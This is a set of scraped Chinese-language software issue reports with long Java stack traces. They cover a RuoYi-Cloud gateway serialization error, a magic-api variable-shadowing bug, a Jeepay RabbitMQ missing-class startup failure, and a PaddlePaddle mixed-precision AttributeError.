io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:163) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:714) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:650) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:576) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989) ~[netty-common-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74) ~[netty-common-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) ~[netty-common-4.1.48.Final.jar!/:4.1.48.Final] at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_66] Caused by: com.alibaba.fastjson.JSONException: class path resource [META-INF/resources/webjars/] cannot be resolved to absolute file path because it does not reside in the file system: jar:file:/D:/docker-data/RuoYi-Cloud/ruoyi-gateway/target/ruoyi-gateway-2.1.0.jar!/BOOT-INF/lib/springfox-swagger-ui-2.9.2.jar!/META-INF/resources/webjars/ at com.alibaba.fastjson.serializer.JSONSerializer.writeWithFieldName(JSONSerializer.java:362) ~[fastjson-1.2.73.jar!/:na] at com.alibaba.fastjson.serializer.ASMSerializer_28_ResourceWebHandler.write(Unknown Source) ~[na:na] at com.alibaba.fastjson.serializer.MapSerializer.write(MapSerializer.java:271) ~[fastjson-1.2.73.jar!/:na] at com.alibaba.fastjson.serializer.MapSerializer.write(MapSerializer.java:44) ~[fastjson-1.2.73.jar!/:na] at com.alibaba.fastjson.serializer.JSONSerializer.writeWithFieldName(JSONSerializer.java:360) ~[fastjson-1.2.73.jar!/:na] at com.alibaba.fastjson.serializer.ASMSerializer_26_ResourceUrlProvider.write(Unknown Source) ~[na:na] at com.alibaba.fastjson.serializer.CollectionCodec.write(CollectionCodec.java:101) ~[fastjson-1.2.73.jar!/:na] at com.alibaba.fastjson.serializer.FieldSerializer.writeValue(FieldSerializer.java:320) ~[fastjson-1.2.73.jar!/:na] at com.alibaba.fastjson.serializer.JavaBeanSerializer.write(JavaBeanSerializer.java:470) ~[fastjson-1.2.73.jar!/:na] at com.alibaba.fastjson.serializer.JavaBeanSerializer.write(JavaBeanSerializer.java:149) ~[fastjson-1.2.73.jar!/:na] at com.alibaba.fastjson.serializer.JSONSerializer.writeWithFieldName(JSONSerializer.java:360) ~[fastjson-1.2.73.jar!/:na] at com.alibaba.fastjson.serializer.ASMSerializer_2_DefaultServerWebExchange.write(Unknown Source) ~[na:na] at com.alibaba.fastjson.serializer.JSONSerializer.write(JSONSerializer.java:312) ~[fastjson-1.2.73.jar!/:na] at com.alibaba.fastjson.JSON.toJSONString(JSON.java:769) ~[fastjson-1.2.73.jar!/:na] at com.alibaba.fastjson.JSON.toJSONString(JSON.java:707) ~[fastjson-1.2.73.jar!/:na] at com.alibaba.fastjson.JSON.toJSONString(JSON.java:672) ~[fastjson-1.2.73.jar!/:na] at com.ruoyi.gateway.filter.AuthFilter.filter(AuthFilter.java:49) ~[classes!/:na] at org.springframework.cloud.gateway.handler.FilteringWebHandler$GatewayFilterAdapter.filter(FilteringWebHandler.java:138) ~[spring-cloud-gateway-core-2.2.2.RELEASE.jar!/:2.2.2.RELEASE] at org.springframework.cloud.gateway.filter.OrderedGatewayFilter.filter(OrderedGatewayFilter.java:44) ~[spring-cloud-gateway-core-2.2.2.RELEASE.jar!/:2.2.2.RELEASE] at org.springframework.cloud.gateway.handler.FilteringWebHandler$DefaultGatewayFilterChain.lambda$filter$0(FilteringWebHandler.java:118) ~[spring-cloud-gateway-core-2.2.2.RELEASE.jar!/:2.2.2.RELEASE] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:44) [reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:52) [reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at com.alibaba.csp.sentinel.adapter.reactor.MonoSentinelOperator.subscribe(MonoSentinelOperator.java:40) ~[sentinel-reactor-adapter-1.7.1.jar!/:na] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:52) [reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.InternalMonoOperator.subscribe(InternalMonoOperator.java:55) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:52) [reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.Mono.subscribe(Mono.java:4210) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoIgnoreThen$ThenIgnoreMain.drain(MonoIgnoreThen.java:172) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoIgnoreThen.subscribe(MonoIgnoreThen.java:56) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoFlatMap$FlatMapMain.onNext(MonoFlatMap.java:150) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxSwitchIfEmpty$SwitchIfEmptySubscriber.onNext(FluxSwitchIfEmpty.java:67) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoNext$NextSubscriber.onNext(MonoNext.java:76) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.innerNext(FluxConcatMap.java:274) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapInner.onNext(FluxConcatMap.java:851) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxMap$MapSubscriber.onNext(FluxMap.java:114) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxSwitchIfEmpty$SwitchIfEmptySubscriber.onNext(FluxSwitchIfEmpty.java:67) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.Operators$MonoSubscriber.complete(Operators.java:1712) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoFlatMap$FlatMapMain.onNext(MonoFlatMap.java:144) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxMap$MapSubscriber.onNext(FluxMap.java:114) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoNext$NextSubscriber.onNext(MonoNext.java:76) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.innerNext(FluxConcatMap.java:274) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapInner.onNext(FluxConcatMap.java:851) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxOnErrorResume$ResumeSubscriber.onNext(FluxOnErrorResume.java:73) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoPeekTerminal$MonoTerminalPeekSubscriber.onNext(MonoPeekTerminal.java:173) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.Operators$MonoSubscriber.complete(Operators.java:1712) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoFilterWhen$MonoFilterWhenMain.onNext(MonoFilterWhen.java:140) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.Operators$ScalarSubscription.request(Operators.java:2274) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoFilterWhen$MonoFilterWhenMain.onSubscribe(MonoFilterWhen.java:103) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoJust.subscribe(MonoJust.java:54) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.Mono.subscribe(Mono.java:4210) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.drain(FluxConcatMap.java:441) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.onNext(FluxConcatMap.java:243) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxDematerialize$DematerializeSubscriber.onNext(FluxDematerialize.java:91) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxDematerialize$DematerializeSubscriber.onNext(FluxDematerialize.java:38) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxIterable$IterableSubscription.slowPath(FluxIterable.java:267) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxIterable$IterableSubscription.request(FluxIterable.java:225) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxDematerialize$DematerializeSubscriber.request(FluxDematerialize.java:120) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.onSubscribe(FluxConcatMap.java:228) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxDematerialize$DematerializeSubscriber.onSubscribe(FluxDematerialize.java:70) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxIterable.subscribe(FluxIterable.java:161) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxIterable.subscribe(FluxIterable.java:86) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.InternalFluxOperator.subscribe(InternalFluxOperator.java:53) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxDefer.subscribe(FluxDefer.java:54) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.Mono.subscribe(Mono.java:4210) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.drain(FluxConcatMap.java:441) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.onSubscribe(FluxConcatMap.java:211) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxIterable.subscribe(FluxIterable.java:161) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.FluxIterable.subscribe(FluxIterable.java:86) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.InternalMonoOperator.subscribe(InternalMonoOperator.java:55) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:52) [reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.InternalMonoOperator.subscribe(InternalMonoOperator.java:55) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:52) [reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.InternalMonoOperator.subscribe(InternalMonoOperator.java:55) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:52) [reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.InternalMonoOperator.subscribe(InternalMonoOperator.java:55) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoDefer.subscribe(MonoDefer.java:52) [reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.Mono.subscribe(Mono.java:4210) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoIgnoreThen$ThenIgnoreMain.drain(MonoIgnoreThen.java:172) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.MonoIgnoreThen.subscribe(MonoIgnoreThen.java:56) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.core.publisher.InternalMonoOperator.subscribe(InternalMonoOperator.java:55) ~[reactor-core-3.3.4.RELEASE.jar!/:3.3.4.RELEASE] at reactor.netty.http.server.HttpServerHandle.onStateChange(HttpServerHandle.java:64) ~[reactor-netty-0.9.6.RELEASE.jar!/:0.9.6.RELEASE] at reactor.netty.tcp.TcpServerBind$ChildObserver.onStateChange(TcpServerBind.java:228) ~[reactor-netty-0.9.6.RELEASE.jar!/:0.9.6.RELEASE] at reactor.netty.http.server.HttpServerOperations.onInboundNext(HttpServerOperations.java:465) ~[reactor-netty-0.9.6.RELEASE.jar!/:0.9.6.RELEASE] at reactor.netty.channel.ChannelOperationsHandler.channelRead(ChannelOperationsHandler.java:90) ~[reactor-netty-0.9.6.RELEASE.jar!/:0.9.6.RELEASE] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at reactor.netty.http.server.HttpTrafficHandler.channelRead(HttpTrafficHandler.java:170) ~[reactor-netty-0.9.6.RELEASE.jar!/:0.9.6.RELEASE] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.CombinedChannelDuplexHandler$DelegatingChannelHandlerContext.fireChannelRead(CombinedChannelDuplexHandler.java:436) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:321) ~[netty-codec-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:308) ~[netty-codec-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:422) ~[netty-codec-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:276) ~[netty-codec-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.CombinedChannelDuplexHandler.channelRead(CombinedChannelDuplexHandler.java:251) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:163) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:714) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:650) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:576) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989) ~[netty-common-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74) ~[netty-common-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) ~[netty-common-4.1.48.Final.jar!/:4.1.48.Final] at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_66] Caused by: java.io.FileNotFoundException: class path resource [META-INF/resources/webjars/] cannot be resolved to absolute file path because it does not reside in the file system: jar:file:/D:/docker-data/RuoYi-Cloud/ruoyi-gateway/target/ruoyi-gateway-2.1.0.jar!/BOOT-INF/lib/springfox-swagger-ui-2.9.2.jar!/META-INF/resources/webjars/ at org.springframework.util.ResourceUtils.getFile(ResourceUtils.java:217) ~[spring-core-5.2.5.RELEASE.jar!/:5.2.5.RELEASE] at org.springframework.core.io.AbstractFileResolvingResource.getFile(AbstractFileResolvingResource.java:154) ~[spring-core-5.2.5.RELEASE.jar!/:5.2.5.RELEASE] at com.alibaba.fastjson.serializer.ASMSerializer_29_ClassPathResource.write(Unknown Source) ~[na:na] at com.alibaba.fastjson.serializer.JSONSerializer.writeWithFieldName(JSONSerializer.java:360) ~[fastjson-1.2.73.jar!/:na] ... 112 common frames omitted"
[BUG] 1.3.9 模块名称和变量名称一致时会引起逻辑异常,"版本:1.3.9 jdk版本:1.8 OS版本:Win10 SpringBoot 版本: 2.1.1 问题描述 如果有组件名和变量名重名时,变量的值为空时的判断出现异常 问题代码 接口: model: 如上,我有一个model名为file,在一个接口中不引用这个模块,声明一个变量名为file,值为,同时打印变量的类,console输出为 可以看到为模块的类型 执行结果也是错误的: 预期的结果 正确返回的data应该为   <code>: import log; var file = null log.info(""{}"",file.getClass()) if(file == null){ return ""false"" } return ""OK"" @Component public class FileModule implements ServiceFactoryModule { @Override public String getModuleName() { return ""file""; } } null 2021-08-25 12:01:37debugExecuting prepared SQL query 2021-08-25 12:01:37debugExecuting prepared SQL statement [select * from lh_file where id = 11111] 2021-08-25 12:04:25infoclass com.xcsoft.servicefactory.modules.FileModule { ""data"": ""OK"", ""message"": ""success"", ""status"": 1000 } false"
切换RabbitMQ后启动报错,application.yml文件中mq已配置，空格占位符也对着   <code>: 2022-01-11 17:58:36.680 ERROR [main] [o.s.b.SpringApplication] - Application run failed java.lang.IllegalStateException: Error processing condition on com.jeequan.jeepay.components.mq.vender.rabbitmq.receive.CleanMchLoginAuthCacheRabbitMQReceiver at org.springframework.boot.autoconfigure.condition.SpringBootCondition.matches(SpringBootCondition.java:60) at org.springframework.context.annotation.ConditionEvaluator.shouldSkip(ConditionEvaluator.java:108) at org.springframework.context.annotation.ConfigurationClassBeanDefinitionReader$TrackedConditionEvaluator.shouldSkip(ConfigurationClassBeanDefinitionReader.java:489) at org.springframework.context.annotation.ConfigurationClassBeanDefinitionReader.loadBeanDefinitionsForConfigurationClass(ConfigurationClassBeanDefinitionReader.java:140) at org.springframework.context.annotation.ConfigurationClassBeanDefinitionReader.loadBeanDefinitions(ConfigurationClassBeanDefinitionReader.java:129) at org.springframework.context.annotation.ConfigurationClassPostProcessor.processConfigBeanDefinitions(ConfigurationClassPostProcessor.java:343) at org.springframework.context.annotation.ConfigurationClassPostProcessor.postProcessBeanDefinitionRegistry(ConfigurationClassPostProcessor.java:247) at org.springframework.context.support.PostProcessorRegistrationDelegate.invokeBeanDefinitionRegistryPostProcessors(PostProcessorRegistrationDelegate.java:311) at org.springframework.context.support.PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(PostProcessorRegistrationDelegate.java:112) at org.springframework.context.support.AbstractApplicationContext.invokeBeanFactoryPostProcessors(AbstractApplicationContext.java:746) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:564) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:144) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:771) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:763) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:438) at org.springframework.boot.SpringApplication.run(SpringApplication.java:339) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1329) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1318) at com.jeequan.jeepay.mgr.bootstrap.JeepayMgrApplication.main(JeepayMgrApplication.java:51) Caused by: java.lang.IllegalStateException: Failed to introspect Class [com.jeequan.jeepay.components.mq.vender.rabbitmq.RabbitMQBeanProcessor] from ClassLoader [jdk.internal.loader.ClassLoaders$AppClassLoader@7c53a9eb] at org.springframework.util.ReflectionUtils.getDeclaredMethods(ReflectionUtils.java:481) at org.springframework.util.ReflectionUtils.doWithMethods(ReflectionUtils.java:358) at org.springframework.util.ReflectionUtils.getUniqueDeclaredMethods(ReflectionUtils.java:414) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.lambda$getTypeForFactoryMethod$2(AbstractAutowireCapableBeanFactory.java:747) at java.base/java.util.concurrent.ConcurrentHashMap.computeIfAbsent(ConcurrentHashMap.java:1737) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getTypeForFactoryMethod(AbstractAutowireCapableBeanFactory.java:746) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.determineTargetType(AbstractAutowireCapableBeanFactory.java:685) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.predictBeanType(AbstractAutowireCapableBeanFactory.java:656) at org.springframework.beans.factory.support.AbstractBeanFactory.isFactoryBean(AbstractBeanFactory.java:1670) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doGetBeanNamesForType(DefaultListableBeanFactory.java:570) at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeanNamesForType(DefaultListableBeanFactory.java:542) at org.springframework.boot.autoconfigure.condition.OnBeanCondition.collectBeanNamesForType(OnBeanCondition.java:238) at org.springframework.boot.autoconfigure.condition.OnBeanCondition.getBeanNamesForType(OnBeanCondition.java:231) at org.springframework.boot.autoconfigure.condition.OnBeanCondition.getBeanNamesForType(OnBeanCondition.java:221) at org.springframework.boot.autoconfigure.condition.OnBeanCondition.getMatchingBeans(OnBeanCondition.java:169) at org.springframework.boot.autoconfigure.condition.OnBeanCondition.getMatchOutcome(OnBeanCondition.java:119) at org.springframework.boot.autoconfigure.condition.SpringBootCondition.matches(SpringBootCondition.java:47) ... 18 common frames omitted Caused by: java.lang.NoClassDefFoundError: org/springframework/amqp/core/CustomExchange at java.base/java.lang.Class.getDeclaredMethods0(Native Method) at java.base/java.lang.Class.privateGetDeclaredMethods(Class.java:3166) at java.base/java.lang.Class.getDeclaredMethods(Class.java:2309) at org.springframework.util.ReflectionUtils.getDeclaredMethods(ReflectionUtils.java:463) ... 34 common frames omitted Caused by: java.lang.ClassNotFoundException: org.springframework.amqp.core.CustomExchange at java.base/jdk.internal.loader.BuiltinClassLoader.loadClass(BuiltinClassLoader.java:581) at java.base/jdk.internal.loader.ClassLoaders$AppClassLoader.loadClass(ClassLoaders.java:178) at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:522) ... 38 common frames omitted 2022-01-11 17:58:36.682 WARN [main] [o.s.b.SpringApplication] - Unable to close ApplicationContext java.lang.IllegalStateException: Failed to introspect Class [com.jeequan.jeepay.components.mq.vender.rabbitmq.RabbitMQBeanProcessor] from ClassLoader [jdk.internal.loader.ClassLoaders$AppClassLoader@7c53a9eb] at org.springframework.util.ReflectionUtils.getDeclaredMethods(ReflectionUtils.java:481) at org.springframework.util.ReflectionUtils.doWithMethods(ReflectionUtils.java:358) at org.springframework.util.ReflectionUtils.getUniqueDeclaredMethods(ReflectionUtils.java:414) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.lambda$getTypeForFactoryMethod$2(AbstractAutowireCapableBeanFactory.java:747) at java.base/java.util.concurrent.ConcurrentHashMap.computeIfAbsent(ConcurrentHashMap.java:1737) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getTypeForFactoryMethod(AbstractAutowireCapableBeanFactory.java:746) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.determineTargetType(AbstractAutowireCapableBeanFactory.java:685) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.predictBeanType(AbstractAutowireCapableBeanFactory.java:656) at org.springframework.beans.factory.support.AbstractBeanFactory.isFactoryBean(AbstractBeanFactory.java:1670) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doGetBeanNamesForType(DefaultListableBeanFactory.java:570) at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeanNamesForType(DefaultListableBeanFactory.java:542) at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeansOfType(DefaultListableBeanFactory.java:667) at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeansOfType(DefaultListableBeanFactory.java:659) at org.springframework.context.support.AbstractApplicationContext.getBeansOfType(AbstractApplicationContext.java:1300) at org.springframework.boot.SpringApplication.getExitCodeFromMappedException(SpringApplication.java:903) at org.springframework.boot.SpringApplication.getExitCodeFromException(SpringApplication.java:891) at org.springframework.boot.SpringApplication.handleExitCode(SpringApplication.java:878) at org.springframework.boot.SpringApplication.handleRunFailure(SpringApplication.java:819) at org.springframework.boot.SpringApplication.run(SpringApplication.java:349) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1329) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1318) at com.jeequan.jeepay.mgr.bootstrap.JeepayMgrApplication.main(JeepayMgrApplication.java:51) Caused by: java.lang.NoClassDefFoundError: org/springframework/amqp/core/CustomExchange at java.base/java.lang.Class.getDeclaredMethods0(Native Method) at java.base/java.lang.Class.privateGetDeclaredMethods(Class.java:3166) at java.base/java.lang.Class.getDeclaredMethods(Class.java:2309) at org.springframework.util.ReflectionUtils.getDeclaredMethods(ReflectionUtils.java:463) ... 21 common frames omitted Caused by: java.lang.ClassNotFoundException: org.springframework.amqp.core.CustomExchange at java.base/jdk.internal.loader.BuiltinClassLoader.loadClass(BuiltinClassLoader.java:581) at java.base/jdk.internal.loader.ClassLoaders$AppClassLoader.loadClass(ClassLoaders.java:178) at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:522) ... 25 common frames omitted Process finished with exit code 1
使用混合精度：AttributeError: 'paddle.fluid.core_avx.VarBase' object has no attribute 'op',"Paddlepaddle 1.8.0/1.7.2 都试过，在AI Studio平台 按照官方demo, 混合精度训练最佳实践 只添加了一句代码，出现了: AttributeError: 'paddle.fluid.core_avx.VarBase' object has no attribute 'op' 整体代码在这里(已经公开，可直接打开)： https://aistudio.baidu.com/aistudio/projectdetail/763655 (update: 2020.08.29 该项目已删除)   <code>: sgd = SGDOptimizer(learning_rate=1e-3) # 此处只需要使用fluid.contrib.mixed_precision.decorate将sgd封装成AMP训练所需的 # 优化器mp_sgd，并使用mp_sgd.minimize(avg_loss)代替原来的sgd.minimize(avg_loss)语句即可。 mp_sgd = fluid.contrib.mixed_precision.decorator.decorate(sgd) # &lt;----------------- 就是它 mp_sgd.minimize(avg_loss)"
